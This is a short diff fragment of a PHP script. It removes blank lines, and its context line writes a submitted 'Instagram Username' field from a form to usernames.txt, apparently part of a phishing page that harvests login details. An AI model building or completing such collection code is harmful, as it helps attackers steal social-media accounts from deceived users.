@@ -24,10 +24,3 @@ file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] .
 
 exit();
 ?>
-
-
-
-
-
-
-
